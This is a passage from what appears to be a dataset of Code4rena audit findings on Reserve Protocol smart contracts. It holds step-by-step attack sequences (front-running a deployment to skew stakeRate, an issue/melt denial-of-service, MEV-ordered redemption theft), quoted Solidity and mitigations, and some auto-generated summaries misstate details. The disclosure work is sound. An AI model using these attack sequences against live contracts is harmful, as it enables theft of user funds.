formula\n\n![](https://user-images.githubusercontent.com/51274081/213756989-03bb092b-a0a3-447a-a0e8-83035559be7b.png)\n$$S' = 4.995$$\n\n### Recommended Mitigation Steps\n\nRather than dividing by 1 (1e18 from the Fixed library), divide it by the `ratio`.\n\n```solidity\n// Furnace.sol\n// Paying out the ratio r, N times, equals paying out the ratio (1 - (1-r)^N) 1 time.\nuint192 payoutRatio = FIX_ONE.minus(FIX_ONE.minus(ratio).powu(numPeriods));\n\nuint256 amount = payoutRatio * lastPayoutBal / ratio;\n```\n\n```solidity\n// StRSR.sol\nuint192 payoutRatio = FIX_ONE - FixLib.powu(FIX_ONE - rewardRatio, numPeriods);\n\n// payout: {qRSR} = D18{1} * {qRSR} / r\nuint256 payout = (payoutRatio * rsrRewardsAtLastPayout) / rewardRatio;\n```\n\n**[tbrent (Reserve) disputed and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/377#issuecomment-1405453764):**\n > I think there is a mistake in the math here, possibly arising from the fact that `rsrRewards()` doesn't correspond to how much rewards _has_ been handed out, but how much is _available_ to be handed out. \n> \n> I don't understand why the warden is computing the sum of `u_i`. If `u_0` is the value of `rsrRewards()` at time 0, and `u_1` is the value of `rsrRewards()` at time 1, why is the sum of `u_i` for all i interesting? This is double-counting balances, since only some of `u_i` is handed out each time. \n> \n> As the number of payouts approach infinity, the total amount handed out approaches `u_0`. \n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/377#issuecomment-1410642492):**\n > Would be good to get the warden to comment here during QA - will see if we can have that occur to clear up the difference in understanding.\n\n***Please note: the following comment and re-assessment took place after judging and awarding were finalized. As such, this report will leave this finding in its originally assessed risk category as it simply reflects a snapshot in time.***\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/377#issuecomment-1428771851):**\n > I want to apologize that I missed the fact that no response was given during QA and currently believe this issue to be invalid.  \n\n**[Franfran (warden) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/377#issuecomment-1429273607):**\n > Hey friends, sorry for not hopping into the discussion earlier!<br>\n> My reasoning was that if the staker's rewards doesn't compound over time, then there is no reason for them to stay in the pool and not harvest the rewards, which is a costly process if they would have to harvest each cycle.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about two instances in the codebase - [`Furnace`](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L77-L79) and [`StRSR`](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L509-L512) - where the composed rewards calculation is wrong. The rewards are calculated by first measuring how much `period` or `rewardPeriod` has occurred since the last payout and calculating in only one step the rewards that should be distributed over these periods.\n\nThe proof of concept was taken from the comments which can be written as a formula:\n\n$$u_{i+1} = u_{i} * (1 - r)$$\n\nThe sum of the formula can be calculated as:\n\n![](https://user-images.githubusercontent.com/51274081/213756676-cbbcf22b-3237-433d-a6e3-9577b6d75474.png)\n\nFor a practical example, let's say that our `rsrRewardsAtLastPayout` is 5, with a `rewardRatio` of 0.9. The sum for n = 3 would be 5.55.\n\nThe recommended mitigation steps are to rather than dividing by 1 (1e18 from the Fixed library), divide it by the `ratio` as shown in the code snippets.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/377",
      "tags": [],
      "finders": [
        "Franfran"
      ]
    },
    {
      "id": "16015",
      "title": "[M-05] Early user can call issue() and then melt() to increase basketsNeeded to supply ratio to its maximum value and then melt() won’t work and contract features like issue() won’t work",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L563-L573\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L801-L814\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L219\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L70-L84\n\n\n## Vulnerability details\n\n## Impact\nFunction `melt()` melt a quantity of RToken from the caller's account, increasing the basket rate. basket rate should be between `1e9` and `1e27` and function `requireValidBUExchangeRate()` checks that if it's not in interval the the code would revert. the call to `requireValidBUExchangeRate()` happens in the function `mint()`, `melt()` and `setBasketsNeeded()` which are used in `issue()` and `handoutExcessAssets()` and `compromiseBasketsNeeded()` which are used in multiple functionality of the systems. early malicious user can call `issue(1e18)` and `melt(1e18 - 1)` and then set the ratio between baskets needed and total supply to `1e27` and then any new action that increase the ratio would fail. because during the `issue()` code calls `melt()` so the issue() would fail for sure and other functionalities can increase the ratio because of the ratio too because of the rounding error which result in revert. so by exploiting this attacker can make RToken to be in broken state and most of the functionalities of the system would stop working.\n\n## Proof of Concept\nThis is `melt()` code:\n```\n    function melt(uint256 amtRToken) external notPausedOrFrozen {\n        _burn(_msgSender(), amtRToken);\n        emit Melted(amtRToken);\n        requireValidBUExchangeRate();\n    }\n```\nAs you can see it allows anyone to burn their RToken balance. This is `requireValidBUExchangeRate()` code:\n```\n    function requireValidBUExchangeRate() private view {\n        uint256 supply = totalSupply();\n        if (supply == 0) return;\n\n        // Note: These are D18s, even though they are uint256s. This is because\n        // we cannot assume we stay inside our valid range here, as that is what\n        // we are checking in the first place\n        uint256 low = (FIX_ONE_256 * basketsNeeded) / supply; // D18{BU/rTok}\n        uint256 high = (FIX_ONE_256 * basketsNeeded + (supply - 1)) / supply; // D18{BU/rTok}\n\n        // 1e9 = FIX_ONE / 1e9; 1e27 = FIX_ONE * 1e9\n        require(uint192(low) >= 1e9 && uint192(high) <= 1e27, \"BU rate out of range\");\n    }\n```\nAs you can see it checks and makes sure that  the BU to RToken exchange rate to be in [1e-9, 1e9]. so Attacker can perform this steps:\n1. add `1e18` RToken as first issuer by calling `issue()`\n2. call `melt()` and burn `1e18 - 1` of his RTokens.\n3. not `basketsNeeded` would be `1e18` and `totalSupply()` of RTokens would be `1` and the BU to RToken exchange rate would be its maximum value `1e27` and `requireValidBUExchangeRate()` won't allow increasing the ratio.\n4. now calls to `melt()` would revert and because `issue()` calls to `furnace.melt()` which calls `RToken.melt()` so all calls to `issue()` would revert. other functionality which result in calling `mint()`, `melt()` and `setBasketsNeeded()` if they increase the ratio would fail too. as there is rounding error when converting RToken amount to basket amount so burning and minting new RTokens and increase the ratio too because of those rounding errors and those logics would revert. (`handoutExcessAssets()` would revert because it mint revenue RToken and update `basketsNeeded` and it calculates new basket amount based on RToken amounts and rounds down so it would increase the BU to RToken ratio which cause code to revert in `mint()`) (`redeem()` would increase the ratio simillar to `handoutExcessAssets()` because of rounding down)\n5. the attacker doesn't need to be first issuer just he needs to be one of the early issuers and by performing the attack and also if the ratio gets to higher value of the maximum allowed the protocol won't work properly as it documented the supported rage for variables to work properly.\n\nso attacker can make protocol logics to be broken and then RToken won't be useless and attacker can perform this attack to any newly deployed RToken.\n\n## Tools Used\nVIM\n\n## Recommended Mitigation Steps\ndon't allow everyone to melt their tokens or don't allow melting if totalSupply() become very small.",
      "summary": "\nThis bug report is about a vulnerability in the code of the Reserve Protocol's RToken. The vulnerability allows malicious users to call the `melt()` function to burn a quantity of RToken from their account, which increases the basket rate. The basket rate should be between `1e9` and `1e27`, and the code checks that if it's not in this interval, the code will revert. The malicious user can call `issue(1e18)` and `melt(1e18 - 1)` and then set the ratio between baskets needed and total supply to `1e27`, which will cause any new action that increases the ratio to fail. This would make the RToken useless and the protocol logics broken. The tools used to identify this vulnerability were VIM. The recommended mitigation steps are to not allow everyone to melt their tokens or don't allow melting if totalSupply() becomes very small.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/384",
      "tags": [],
      "finders": [
        "unforgiven"
      ]
    },
    {
      "id": "16014",
      "title": "[M-04] Redemptions during undercollateralization can be hot-swapped to steal all funds",
      "impact": "MEDIUM",
      "content": "\nDuring recollateralization/a switch basket/when the protocol collateral isn't sound, a user can have almost their entire redemption transaction hot swapped for nothing.\n\nFor example, trying to redeem 1M collateral for 1M rTokens could have the user end up with 0 collateral and 0 rTokens, just by calling the `redeem` function at the wrong time.\n\nExample:\n\n*   User A issues 1M rToken for 1M tokenA\n\n*   Evil user sees tokenA is about to become disabled, and that User A sent a normally innocuous redeem tx for too much underlying collateral in the mempool\n\n*   Evil user orders transactions so they and RSR/Rtoken holders can steal user A's funds\n\n*   They first buy a ton of tokenA and send it to the backing Manager\n\n*   They call `manageTokens` which flash issues a ton of new Rtoken due to the inflated tokenA balance, increasing the totalSupply\n\n*   The increase in total supply allows the normal redemption cap to be drastically lifted\n\n*   They then let the disabling of tokenA process, and calls refreshBasket where a backup token (tokenB) kicks in\n\n*   We are now undercollateralized, and evil user sends tokenB dust to the backingmanager\n\n*   FINALLY: the original redemption TX is ordered, and due to the inflated RToken supply, the battery discharge amount is also inflated, allowing the redemption to go through. Due to the new collateral in place, they redeem ALL their Rtoken (1M) for dust of tokenB!! The protocol has essentially honeypotted them!!\n\n### Proof of Concept\n\nWe provide the proof of code in `proof of code` section.\n\n1.  MEV\n\nThis relies on a validator being malicious with for-profit motives. It would be pretty easy for them to setup a bot looking for this exact scenario though and just staying dormant till the time is right. If they get to order the transactions, they can make a fat profit from the victim.\n\n2.  Backing manager can flash issue RToken\n\nIf the backingManger has too many excess assets, it will flash issue as [many RTokens as](https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/BackingManager.sol#L201) possible to even the collateral to RTokens.\n\n    function handoutExcessAssets(IERC20[] calldata erc20s) private {\n    .\n    .\n    if (held.gt(needed)) {\n    .\n    .\n    rToken.mint(address(this), uint256(rTok));\n\n3.  Increasing the supply increases the redemption and issuance block cap\n\nThe RedemptionBattery's currentCharge function is [dependent on the total supply of RTokens](https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/libraries/RedemptionBattery.sol#L59). So if the total supply is raised, you can redeem way more than you should be able to.\n\n    uint256 amtPerHour = (supply * battery.scalingRedemptionRate) / FIX_ONE_256;\n\n(This also is true for issuance.)\n\n4.  Anyone can call [refreshBasket when a collateral](https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/BasketHandler.sol#L179) is disabled\n\n```\n\n    function refreshBasket() external {\n            assetRegistry.refresh();\n\n            require(\n                main.hasRole(OWNER, _msgSender()) ||\n                    (status() == CollateralStatus.DISABLED && !main.pausedOrFrozen()),\n                \"basket unrefreshable\"\n            );\n            _switchBasket();\n        }\n```\n\nSo if I see a tx where a collateral is about to be disabled, I can chain it with the refreshbasket TX myself.\n\n5.  Redemptions can occur when protocol is undercollateralized\n\nThe `redeem` function has this check:\n\n    require(basketHandler.status() != CollateralStatus.DISABLED, \"collateral default\");\n\nWhich checks if the collateral is good, but NOT if the protocol is fullyCollateralized. Since we chain the disabled asset with the refreshBasket TX, the backup collateral kicks in, and the collateral status becomes `SOUND`. However, normally, we'd have 0 of the new collateral and any redemptions would fail, since there isn't anything to give back.\n\n6.  Sending dust to backing manager\n\nSo, if you send a tiny tiny bit of the new collateral to the protocol, the protocol will process the redemption and give them their `prorata` share of the collateral, which right now is almost 0, but still burn all the rToken being redeemed.\n\n[RToken.sol](https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/RToken.sol#L475)\n\n    // amount is never changed, they burn all the rToken\n    // in our example above, all 1M Rtoken are burned!\n    _burn(redeemer, amount);\n\nAnd we calculate how much they get back like so. We see how much `$` we currently have in the basket, and hand back those amounts accordingly. Since we have almost no money, we are going to give them almost nothing for their rTokens.\n\n    (address[] memory erc20s, uint256[] memory amounts) = basketHandler.quote(baskets, FLOOR);\n    uint256 erc20length = erc20s.length;\n    // Bound each withdrawal by the prorata share, in case we're currently under-collateralized\n            for (uint256 i = 0; i < erc20length; ++i) {\n                // {qTok}\n                uint256 bal = IERC20Upgradeable(erc20s[i]).balanceOf(address(backingManager));\n\n                // gas-optimization: only do the full mulDiv256 if prorate is 0\n                uint256 prorata = (prorate > 0)\n                    ? (prorate * bal) / FIX_ONE // {qTok} = D18{1} * {qTok} / D18\n                    : mulDiv256(bal, amount, supply); // {qTok} = {qTok} * {qRTok} / {qRTok}\n\n                if (prorata < amounts[i]) amounts[i] = prorata;\n            }\n\nAnd just like that, a seemingly innocuous redemption transaction was a trap the whole time. The next step would be to go through the rest of the process to see how much our evil user profited (from running the auctions), as they need to be a whale to inflate the RToken supply. However, we've seen attacks like this, and one could consider it a [highly profitable trading strategy](https://twitter.com/avi_eisen/status/1581326197241180160?s=20\\&t=8WpEg76bW_Kk8YaJ5orP5Q). If they buy up majority shares in the RToken, or, they coordinate with most of the StRSR token holders they could advertise and honey pot people to do redemptions whenever a switchBasket is coming. Spread FUD like \"you need to redeem otherwise you'll lose money!\" and it's the redeeming that actually steals their money.\n\n### Tools Used\n\nHardhat\n\n### Recommended Mitigation Steps\n\nDisallow issuance/redemptions while the protocol is undercollateralized.\n\n### Proof Of Code\n\nSee warden's [original submission](https://github.com/code-423n4/2023-01-reserve-findings/issues/399) for full details.\n\n**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/399#issuecomment-1399349370):**\n > Certainly a creative attack vector, will leave open for sponsor review.  I am unclear on a few nuances of the attack here, but ultimately would like the sponsor to comment.\n> \n> Downgrading to Medium for the moment due to a very particular sequence of events being required for this to be executed. \n\n**[tbrent (Reserve) confirmed and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/399#issuecomment-1405418612):**\n > The bug is simpler than the description. If the basket is DISABLED, then all that needs to happen is for a redeem tx to be in the mempool. An MEV searcher can order a `refreshBasket()` call earlier in the block, causing the redemption to be partial. This acts as a net transfer between the RToken redeemer and RSR stakers, who will eventually collect the money. \n\n**[tbrent (Reserve) mitigated](https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed):**\n > This PR allows an RToken redeemer to specify when they require full redemptions vs accept partial (prorata) redemptions.<br>\n> [reserve-protocol/protocol#615](https://github.com/reserve-protocol/protocol/pull/615)\n\n**Status:** Not fully mitigated. Full details in reports from [0xA5DF](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/54), [HollaDieWaldfee](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/14), and [AkshaySrivastav](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/69). Also included in Mitigation Review section below.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Reserve Protocol's RToken.sol contract. This vulnerability allows an evil user to exploit the protocol and steal funds from other users. This is done by exploiting the protocol's recollateralization process and ordering transactions in a specific way. \n\nThe evil user first buys a ton of tokenA and sends it to the backing Manager. They then call manageTokens which flash issues a ton of new Rtoken due to the inflated tokenA balance, increasing the totalSupply. The increase in total supply allows the normal redemption cap to be drastically lifted. The evil user then lets the disabling of tokenA process, and calls refreshBasket where a backup token (tokenB) kicks in. The protocol is now undercollateralized, and the evil user sends tokenB dust to the backingmanager. \n\nWhen the original redemption TX is ordered, due to the inflated RToken supply, the battery discharge amount is also inflated, allowing the redemption to go through. This allows the evil user to redeem all their Rtoken for dust of tokenB. The protocol has essentially honeypotted the user.\n\nThe bug report suggests disallowing issuance/redemptions while the protocol is undercollateralized as a mitigation step. The proof of code can be found in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/399",
      "tags": [],
      "finders": [
        "Cyfrin"
      ]
    },
    {
      "id": "16013",
      "title": "[M-03] Baited by redemption during undercollateralization (no issuance, just transfer)",
      "impact": "MEDIUM",
      "content": "\nThis is similar to the \"high\" vulnerability I submitted, but also shows a similar exploit can be done if a user isn't a whale, and isn't issuing anything.\n\nA user can send a redeem TX and an evil actor can make it so they get almost nothing back during recollateralization. This requires ordering transactions, or just getting very unlucky with the order of your transaction.\n\n### Proof of Concept\n\n*   UserA is looking to redeem their rToken for tokenA (the max the battery will allow, let's say 100k)\n\n*   A basket refresh is about to be triggered\n\n*   Evil user wants the protocol to steal UserA's funds\n\n*   UserA sends redeem TX to the mempool, but Evil user move transactions around before it hits\n\n*   Evil user calls refreshbasket in same block as original collateral (tokenA) is disabled, kicking in backupconfig (tokenB)\n\n*   Protocol is now undercollateralized but collateral is sound (tokenB is good)\n\n*   Evil sends 1tokenB to backingManager to UserA's redeem has something to redeem\n\n*   UserA's redemption tx lands, and redeems 100k rTokens for a fraction of tokenB!\n\nUserA redeems and has nothing to show for it!\n\nEvil user only had to buy 1 tokenB (or even less) to steal 100k of their rToken.\n\n### Tools Used\n\nHardhat\n\n### Recommended Mitigation Steps\n\nDisallow redemptions/issuance during undercollateralization\n\n### Proof of Code\n\nSee warden's [original submission](https://github.com/code-423n4/2023-01-reserve-findings/issues/416) for full details.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/416#issuecomment-1402220739):**\n > Not sure this is distinct enough from the other attack vector to stand alone, leaving open for sponsor comment before duping.\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/416#issuecomment-1405419594):**\n > Duplicate of [`#399`](https://github.com/code-423n4/2023-01-reserve-findings/issues/399) \n\n**[tbrent (Reserve) confirmed](https://github.com/code-423n4/2023-01-reserve-findings/issues/416#issuecomment-1419296557)**\n\n***Please note: the following comment and re-assessment took place after judging and awarding were finalized. As such, this report will leave this finding in its originally assessed risk category as it simply reflects a snapshot in time.***\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/416#issuecomment-1428777177):**\n > After re-reviewing, I do believe this should have been included in the [M-04](https://github.com/code-423n4/2023-01-reserve-findings/issues/399) batch of issues as well.  As it is past the QA period, no changes will be made to awards, but I wanted to comment as such for the benefit of the sponsor.\n\n*Note: see mitigation status under M-04 below.*\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a vulnerability in the Reserve Protocol's RToken contract. This vulnerability can be exploited to allow an evil actor to steal funds from a user who is trying to redeem their rToken for tokenA. This exploit requires ordering transactions, or getting very unlucky with the order of the transaction. \n\nThe recommended mitigation step is to disallow redemptions/issuance during undercollateralization. The bug report also includes proof of concept and proof of code to help test the vulnerability. \n\nTo test the vulnerability, one must first clone the repository from github, copy paste the code to a file, then apply the changes to the code. After this, one must run the yarn and hardhat test commands to test the vulnerability. \n\nIn conclusion, this bug report is about a vulnerability in the Reserve Protocol's RToken contract. The exploit requires ordering transactions, or getting very unlucky with the order of the transaction. The recommended mitigation step is to disallow redemptions/issuance during undercollateralization. The bug report also includes proof of concept and proof of code to help test the vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/416",
      "tags": [],
      "finders": [
        "Cyfrin"
      ]
    },
    {
      "id": "16012",
      "title": "[M-02] Attacker can make stakeRate to be 1 in the StRSR contract and users depositing tokens can lose funds because of the big rounding error",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L160-L188><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L496-L530><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L212-L237>\n\nCode calculates amount of stake token and rsr token based on `stakeRate` and if `stakeRate` was near `1e18` then division error is small but attacker can cause `stakeRate` to be 1 and that can cause users to loss up to `1e18` token during stake and unstake.\n\n### Proof of Concept\n\nThis is `init()` code:\n\n        function init(\n            IMain main_,\n            string calldata name_,\n            string calldata symbol_,\n            uint48 unstakingDelay_,\n            uint48 rewardPeriod_,\n            uint192 rewardRatio_\n        ) external initializer {\n            require(bytes(name_).length > 0, \"name empty\");\n            require(bytes(symbol_).length > 0, \"symbol empty\");\n            __Component_init(main_);\n            __EIP712_init(name_, \"1\");\n            name = name_;\n            symbol = symbol_;\n\n            assetRegistry = main_.assetRegistry();\n            backingManager = main_.backingManager();\n            basketHandler = main_.basketHandler();\n            rsr = IERC20(address(main_.rsr()));\n\n            payoutLastPaid = uint48(block.timestamp);\n            rsrRewardsAtLastPayout = main_.rsr().balanceOf(address(this));\n            setUnstakingDelay(unstakingDelay_);\n            setRewardPeriod(rewardPeriod_);\n            setRewardRatio(rewardRatio_);\n\n            beginEra();\n            beginDraftEra();\n        }\n\nAs you can see it sets the value of the `rsrRewardsAtLastPayout` as contract balance when contract is deployed.\nThis is `_payoutReward()` code:\n\n        function _payoutRewards() internal {\n            if (block.timestamp < payoutLastPaid + rewardPeriod) return;\n            uint48 numPeriods = (uint48(block.timestamp) - payoutLastPaid) / rewardPeriod;\n\n            uint192 initRate = exchangeRate();\n            uint256 payout;\n\n            // Do an actual payout if and only if stakers exist!\n            if (totalStakes > 0) {\n                // Paying out the ratio r, N times, equals paying out the ratio (1 - (1-r)^N) 1 time.\n                // Apply payout to RSR backing\n                // payoutRatio: D18 = FIX_ONE: D18 - FixLib.powu(): D18\n                // Both uses of uint192(-) are fine, as it's equivalent to FixLib.sub().\n                uint192 payoutRatio = FIX_ONE - FixLib.powu(FIX_ONE - rewardRatio, numPeriods);\n\n                // payout: {qRSR} = D18{1} * {qRSR} / D18\n                payout = (payoutRatio * rsrRewardsAtLastPayout) / FIX_ONE;\n                stakeRSR += payout;\n            }\n\n            payoutLastPaid += numPeriods * rewardPeriod;\n            rsrRewardsAtLastPayout = rsrRewards();\n\n            // stakeRate else case: D18{qStRSR/qRSR} = {qStRSR} * D18 / {qRSR}\n            // downcast is safe: it's at most 1e38 * 1e18 = 1e56\n            // untestable:\n            //      the second half of the OR comparison is untestable because of the invariant:\n            //      if totalStakes == 0, then stakeRSR == 0\n            stakeRate = (stakeRSR == 0 || totalStakes == 0)\n                ? FIX_ONE\n                : uint192((totalStakes * FIX_ONE_256 + (stakeRSR - 1)) / stakeRSR);\n\n            emit RewardsPaid(payout);\n            emit ExchangeRateSet(initRate, exchangeRate());\n        }\n\nAs you can see it sets the value of the `stakeRate`  to `(totalStakes * FIX_ONE_256 + (stakeRSR - 1)) / stakeRSR`.\n\nSo to exploit this attacker needs to perform these steps:\n\n1.  send `200 * 1e18` RSR tokens (18 is the precision) to the StRSR address before its deployment by watching mempool and front running. the deployment address is calculable before deployment.\n2.  function `init()` would get executed and would set `200 * 1e18` as `rsrRewardsAtLastPayout`.\n3.  then attacker would call `stake()` and stake 1 RSR token (1 wei) in the contract and the value of `stakeRSR` and `totalStakes` would be 1.\n4.  then attacker wait for `rewardPeriod` seconds and then call `payoutReward()` and code would pay rewards based on `rewardRatio` and `rsrRewardsAtLastPayout` and as `rewardRatio` is higher than 1% (default and normal mode) code would increase `stakeRate` more than `2 * 1e18` amount. and then code would set `stakeRate` as `totalStakes * FIX_ONE_256 + (stakeRSR - 1)) / stakeRSR = 1`.\n5.  then calls to `stake()` would cause users to lose up to `1e18` RSR tokens as code calculates stake amount as `newTotalStakes = (stakeRate * newStakeRSR) / FIX_ONE` and rounding error happens up to `FIX_ONE`. because the calculated stake amount is worth less than deposited rsr amount up to `1e18`.\n6.  attacker can still users funds by unstaking 1 token and receiving `1e18` RSR tokens. because of the rounding error in `unstake()`\n\nso attacker can manipulate the `stakeRate` in contract deployment time with sandwich attack which can cause other users to lose funds because of the big rounding error.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nPrevent early manipulation of the PPS.\n\n**[tbrent (Reserve) confirmed](https://github.com/code-423n4/2023-01-reserve-findings/issues/439)**\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/439#issuecomment-1421600557):**\n > Addressed in https://github.com/reserve-protocol/protocol/pull/617\n\n**Status:** Mitigation confirmed with comments. Full details in reports from [0xA5DF](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/51), [HollaDieWaldfee](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/20), and [AkshaySrivastav](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/27).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the Reserve Protocol's StRSR contract. This vulnerability can be exploited by an attacker to manipulate the stake rate and cause other users to lose up to 1e18 tokens during stake and unstake operations. The attacker can cause this to happen by performing a sandwich attack at the time of the contract's deployment.\n\nThe code in question is located in the following lines: 160-188, 496-530, and 212-237. The vulnerability is present in the `init()` and `_payoutReward()` functions. In the `init()` function, the code sets the `rsrRewardsAtLastPayout` as the contract's balance when it is deployed. In the `_payoutReward()` function, the code sets the `stakeRate` to `(totalStakes * FIX_ONE_256 + (stakeRSR - 1)) / stakeRSR`.\n\nTo exploit this vulnerability, the attacker must first send 200 * 1e18 RSR tokens to the StRSR address before its deployment. This is done by watching the mempool and front running. The attacker then calls the `init()` function, which sets the `rsrRewardsAtLastPayout` to 200 * 1e18. The attacker then calls the `stake()` function and stakes 1 RSR token (1 wei) in the contract. This causes the `stakeRSR` and `totalStakes` values to be 1. The attacker then waits for the `rewardPeriod` to pass and calls the `payoutReward()` function. This increases the `stakeRate` more than 2 * 1e18 due to the `rewardRatio` being higher than 1%. The code then sets the `stakeRate` to 1. Finally, the attacker can cause users to lose up to 1e18 RSR tokens by calling the `stake()` and `unstake()` functions, due to the rounding error present in those functions.\n\nTo mitigate this vulnerability, it is recommended to prevent early manipulation of the PPS.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/439",
      "tags": [],
      "finders": [
        "unforgiven"
      ]
    },
    {
      "id": "16011",
      "title": "[M-01] Battery discharge mechanism doesn’t work correctly for first redemption",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/libraries/RedemptionBattery.sol#L59-L70\n\n\n## Vulnerability details\n\n## Impact\nThe `RTokenP1` contract implements a throttling mechanism using the `RedemptionBatteryLib` library. The library models a \"battery\" which \"recharges\" linearly block by block, over roughly 1 hour.\n\nRToken.sol\n```solidity\n    function redeem(uint256 amount) external notFrozen {\n        // ...\n\n        uint256 supply = totalSupply();\n\n        // ...\n        battery.discharge(supply, amount); // reverts on over-redemption\n\n        // ...\n    }\n```\nRedemptionBatteryLib.sol\n```solidity\n    function discharge(\n        Battery storage battery,\n        uint256 supply,\n        uint256 amount\n    ) internal {\n        if (battery.redemptionRateFloor == 0 && battery.scalingRedemptionRate == 0) return;\n\n        // {qRTok}\n        uint256 charge = currentCharge(battery, supply);\n\n        // A nice error message so people aren't confused why redemption failed\n        require(amount <= charge, \"redemption battery insufficient\");\n\n        // Update battery\n        battery.lastBlock = uint48(block.number);\n        battery.lastCharge = charge - amount;\n    }\n\n    /// @param supply {qRTok} Total RToken supply before the burn step\n    /// @return charge {qRTok} The current total charge as an amount of RToken\n    function currentCharge(Battery storage battery, uint256 supply)\n        internal\n        view\n        returns (uint256 charge)\n    {\n        // {qRTok/hour} = {qRTok} * D18{1/hour} / D18\n        uint256 amtPerHour = (supply * battery.scalingRedemptionRate) / FIX_ONE_256;\n\n        if (battery.redemptionRateFloor > amtPerHour) amtPerHour = battery.redemptionRateFloor;\n\n        // {blocks}\n        uint48 blocks = uint48(block.number) - battery.lastBlock; \n\n        // {qRTok} = {qRTok} + {qRTok/hour} * {blocks} / {blocks/hour}\n        charge = battery.lastCharge + (amtPerHour * blocks) / BLOCKS_PER_HOUR;\n\n        uint256 maxCharge = amtPerHour > supply ? supply : amtPerHour;\n        if (charge > maxCharge) charge = maxCharge;\n    }\n```\nThe linear redemption limit is calculated in the `currentCharge` function. This function calculates the delta blocks by `uint48 blocks = uint48(block.number) - battery.lastBlock;`.\n\nThe bug here is that the `lastBlock` value is never initialized by the `RTokenP1` contract so its value defaults to `0`. This results in incorrect delta blocks value as the delta blocks comes out to be an incorrectly large value\n```\n        blocks = current block number - 0 = current block number\n```\n\nDue do this issue, the `currentCharge` value comes out to be way larger than the actual intended value for the first RToken redemption. The `maxCharge` cap at the end of `currentCharge` function caps the result to the current total supply of RToken. \n\nThe issue results in an instant first RToken redemption for the full `totalSupply` of the RToken. The battery discharging mechanism is completely neglected.\n\nIt should be noted that the issue only exists for the first ever redemption as during the first redemption the `lastBlock` value gets updated with current block number.  \n\n\n## Proof of Concept\nThe following test case was added to `test/RToken.test.ts` file and was ran using command `PROTO_IMPL=1 npx hardhat test ./test/RToken.test.ts`.\n\n```typescript\n  describe.only('Battery lastBlock bug', () => {\n    it('redemption battery does not work on first redemption', async () => {\n      // real chain scenario\n      await 